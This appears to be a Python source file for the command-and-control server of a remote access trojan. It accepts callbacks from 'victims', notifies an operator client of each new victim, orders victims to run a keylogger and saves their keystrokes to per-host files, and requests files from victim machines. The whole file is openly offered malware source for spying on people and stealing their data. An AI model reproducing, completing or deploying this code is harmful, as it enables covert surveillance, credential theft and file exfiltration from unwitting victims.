from __future__ import print_function
import socket
import datetime
import threading
from Tkinter import END, NORMAL
import db
import Connection
import struct

class Server:
    """
    Server class to handle server operations
    These include:
        1. accept connections
        2. pass information to client GUI
        3. execute commands from client.py
        4. Handle DB operations
    """

    def __init__(self):
        return

    def getIP(f):
        """
        get the IP of machine the server class is running on by connecting to www.google.com
        and reading the IP address
        """
        s = socket.socket()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('google.com', 0))
        host = s.getsockname()[0]
        s.close()
        return host

    port = 44444
    cli = None
    s = socket.socket()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((getIP("d"), port))
    s.listen(5)
    DB = db.DB()
    currentConnections = []
    clientConnected = False

    @staticmethod
    def newConn(nc):
        """
        function is used in thread to handle when client has disconnected
        Not very efficient but consistently checks to see if victim is connected
        :param nc: connection object
        :return:
        """
        while (True):
            try:
                nc.socket.getpeername()
            except:
                ip = nc.ip
                hostname = nc.hostname
                print("disconnect")
                return


    @staticmethod
    def trimMessage(m):
        """
        trims the message received from victim to readable form
        :param m: string from socket.recv()
        :return:
        """
        newM = m.split('\x00')[0]
        return newM

    @staticmethod
    def waitForConns():
        """
        used in thread when waiting for victims to callback
        """
        while (True):
            global s
            c, addr = Server.s.accept()
            hostname = Server.trimMessage(Server.recvMsg(c))
            uniq = Server.trimMessage(Server.recvMsg(c))
            print(hostname)
            print(uniq)
            nc = Connection.Connection(uniq, addr, hostname)
            if(uniq == "-1"):
                Server.sendMsg(c, "Welcome to the server...\n")
                Server.clientConnected = True
                Server.cli = c
            else:
                if(Server.clientConnected):
                    Server.sendMsg(Server.cli, "New victim...\n")
                    Server.sendMsg(Server.cli ,str(nc))
                t = threading.Thread(target=Server.newConn, args=[nc])
                t.setDaemon(True)
                t.start()

    @staticmethod
    def keyLog(conn):
        sock = socket.socket(conn.socket)
        sock.sendall("log")
        Server.recvKeyLogs(conn)

    @staticmethod
    def recvKeyLogs(conn):
        """
        keys pressed by victim are handled by this function
        they are logged in a text file
        """
        host = conn.hostname
        date = str(datetime.date.today())
        f = open(host+"_"+date+'_keys.txt', 'w')
        while (True):
            sock = socket.socket(conn.socket)
            key = sock.recv(512)
            f.write(key)
            print(key[0][0])

    #need to make this handle Connection objects and no list
    def whatDo(self, cmd):
        """
        handles command from client.py
        decides what command the user wants to execute
        """
        if (cmd[1] == "log"):
            Server.keyLog(cmd[0])
        elif("keylog" == cmd[1]):
            Server.keyLog(cmd[0])
        elif ("download" in cmd[1]):
            Server.downloadFile(cmd[0])


    def downloadFile(sock):
        """
         fucntion that requests and handles download
         sock: socket object
        """
        sock.send("send")
        f = open("test.jpg", "w")
        while (True):
            line = sock.recv(255)
            print(line)
            f.write(line)

    @staticmethod
    def sendMsg(sock, m):
        m = struct.pack('>I', len(m)) + m
        sock.sendall(m)

    @staticmethod
    def recvMsg(sock):
        rawMsgLen = Server.recvall(sock, 4)
        if(rawMsgLen[0] == "0"):
            msgLen = int(rawMsgLen, 0)
        else:
            msgLen = struct.unpack('>I', rawMsgLen)[0]
        return Server.recvall(sock, msgLen)

    @staticmethod
    def recvall(sock, n):
        data = ''
        while len(data) < n:
            packet = sock.recv(n-len(data))
            data += packet
        return data

    def startServer(self):
        Server.waitForConns()
